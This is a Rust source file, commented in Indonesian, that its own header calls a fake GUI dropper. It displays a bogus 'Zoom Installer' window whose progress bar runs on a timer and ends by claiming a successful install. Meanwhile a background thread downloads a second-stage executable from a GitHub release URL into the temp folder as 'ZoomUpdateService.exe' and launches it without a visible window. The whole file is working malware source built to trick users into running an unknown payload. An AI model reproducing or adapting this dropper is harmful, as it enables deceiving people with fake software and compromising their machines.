// main.rs - Dropper GUI palsu yang ditulis dalam Rust
// Fokus pada ukuran kecil, kecepatan, dan keamanan memori.

// Atribut untuk menonaktifkan jendela konsol hitam saat rilis
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

extern crate native_windows_gui as nwg;
extern crate native_windows_derive as nwd;

use nwd::NwgUi;
use nwg::NativeUi;
use std::thread;
use std::env;
use std::fs::File;
use std::io::copy;
use std::process::Command;
use std::os::windows::process::CommandExt; // Diperlukan untuk flag CREATE_NO_WINDOW

// --- Konfigurasi ---
const STAGE2_URL: &str = "https://github.com/GlgApr/release-gang/releases/download/test/Zoom_V5_TweakCloudflared.exe";
const STAGE2_FILENAME: &str = "ZoomUpdateService.exe";

#[derive(Default, NwgUi)]
pub struct FakeInstaller {
    // (DIPERBARUI) Menggunakan flag "WINDOW|VISIBLE" yang standar dan benar
    #[nwg_control(size: (450, 200), position: (300, 300), title: "Zoom Installer", flags: "WINDOW|VISIBLE")]
    #[nwg_events( OnWindowClose: [nwg::stop_thread_dispatch()] )]
    window: nwg::Window,

    #[nwg_control(text: "Installing, please wait...", size: (400, 20), position: (20, 20))]
    label: nwg::Label,

    #[nwg_control(size: (400, 20), position: (20, 50), range: 0..100)]
    progress: nwg::ProgressBar,

    #[nwg_control(text: "Cancel", size: (100, 30), position: (175, 100), enabled: false)]
    button: nwg::Button,

    // Notice digunakan untuk komunikasi antar thread (untuk menutup GUI)
    #[nwg_control]
    #[nwg_events( OnNotice: [FakeInstaller::on_complete] )]
    notice: nwg::Notice,
}

impl FakeInstaller {
    fn on_complete(&self) {
        // Fungsi ini dipanggil oleh thread background saat tugas selesai
        self.window.close();
    }
}

fn download_and_execute(notice_sender: nwg::NoticeSender) {
    // Fungsi ini berjalan di thread terpisah
    if let Ok(mut temp_dir) = env::temp_dir().into_os_string().into_string() {
        temp_dir.push_str("\\");
        temp_dir.push_str(STAGE2_FILENAME);
        let file_path = temp_dir;
        
        // Unduh file
        if let Ok(response) = reqwest::blocking::get(STAGE2_URL) {
            if let Ok(mut dest) = File::create(&file_path) {
                // Gunakan blok 'if let' untuk menangani potensi error pada response.bytes()
                if let Ok(bytes) = response.bytes() {
                    let _ = copy(&mut bytes.as_ref(), &mut dest);

                    // Jalankan payload secara tersembunyi
                    let _ = Command::new(&file_path)
                        .creation_flags(0x08000000) // CREATE_NO_WINDOW
                        .spawn();
                }
            }
        }
    }
    // Kirim sinyal bahwa tugas selesai
    notice_sender.notice();
}

fn main() {
    nwg::init().expect("Failed to init NWG");
    let app = FakeInstaller::build_ui(Default::default()).expect("Failed to build UI");

    // Dapatkan sender untuk Notice
    let notice_sender = app.notice.sender();

    // Mulai thread download di background
    thread::spawn(move || {
        download_and_execute(notice_sender);
    });
    
    // Animasikan progress bar di thread utama
    for i in 0..=100 {
        app.progress.set_pos(i);
        if i == 30 { app.label.set_text("Extracting files..."); }
        if i == 70 { app.label.set_text("Configuring components..."); }
        if i == 100 { app.label.set_text("Installation successful!"); }
        thread::sleep(std::time::Duration::from_millis(100));
    }
    
    // Tunggu GUI ditutup
    nwg::dispatch_thread_events();
}
